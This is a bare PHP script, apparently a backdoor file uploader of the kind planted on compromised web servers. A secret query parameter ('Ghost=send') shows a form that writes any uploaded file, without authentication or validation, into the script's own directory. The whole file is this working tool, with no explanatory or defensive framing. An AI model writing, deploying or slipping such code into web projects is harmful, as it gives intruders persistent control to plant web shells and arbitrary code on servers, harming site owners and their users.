<?php
if($_GET['Ghost'] =='send'){


$uploaddir = './';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
if ( isset($_FILES["userfile"]) ) {
    echo "Upload ";
    if (move_uploaded_file
($_FILES["userfile"]["tmp_name"], $uploadfile))
echo $uploadfile;
    else echo "failed";
}


   echo "
<form name='uplform' method='post' action='?Ghost=send'
enctype='multipart/form-data'>
<p align='center'>
<input type='file' name='userfile'>
<input type='submit'>
</p>
";
}
?>